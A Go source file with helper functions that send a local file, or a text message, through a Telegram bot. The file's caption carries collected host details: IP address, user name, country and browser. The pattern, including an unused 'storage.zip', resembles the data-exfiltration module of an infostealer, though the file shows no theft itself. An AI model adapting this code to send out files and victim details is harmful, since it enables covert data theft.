package pkg

import (
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"log"
	"os"
)

func SendFileByBotTele(token string, path string) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = true

	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	///////

	file, err := os.Open(path)
	if err != nil {
		log.Panic(err)
	}
	defer file.Close()

	fileBytes := tgbotapi.FileBytes{
		Name:  path,
		Bytes: make([]byte, 0),
	}

	fileInfo, _ := file.Stat()
	fileSize := fileInfo.Size()
	bytes := make([]byte, fileSize)
	file.Read(bytes)
	fileBytes.Bytes = bytes

	////////////

	updates, err := bot.GetUpdatesChan(u)

	message_telegram := CollectData()
	caption := fmt.Sprintf("%s \n %s \n %s \n %s \n %s \n %s \n %s",
		message_telegram.Time,
		message_telegram.ReceivedDataBot,
		message_telegram.BotType,
		message_telegram.IPAddress,
		message_telegram.UserName,
		message_telegram.Country,
		message_telegram.Browser)

	for update := range updates {
		if update.Message == nil { // ignore any non-Message Updates
			continue
		}

		log.Printf("%s \n %s \n %s \n %s  ",

			update.Message.From.UserName,

			update.Message.Text)

		////

		documentConfig := tgbotapi.DocumentConfig{
			BaseFile: tgbotapi.BaseFile{
				BaseChat: tgbotapi.BaseChat{
					ChatID: update.Message.Chat.ID,
				},
				UseExisting: false,
				FileID:      "",
				File:        fileBytes,
			},
			Caption: caption,
		}

		/////

		bot.Send(documentConfig)
	}
}

func SendTextByBotTele(token string, message string) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = true

	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	///////

	file, err := os.Open("storage.zip")
	if err != nil {
		log.Panic(err)
	}
	defer file.Close()

	updates, err := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil { // ignore any non-Message Updates
			continue
		}

		log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)

		msg := tgbotapi.NewMessage(update.Message.Chat.ID, message)
		msg.ReplyToMessageID = update.Message.MessageID

		bot.Send(msg)
	}
}
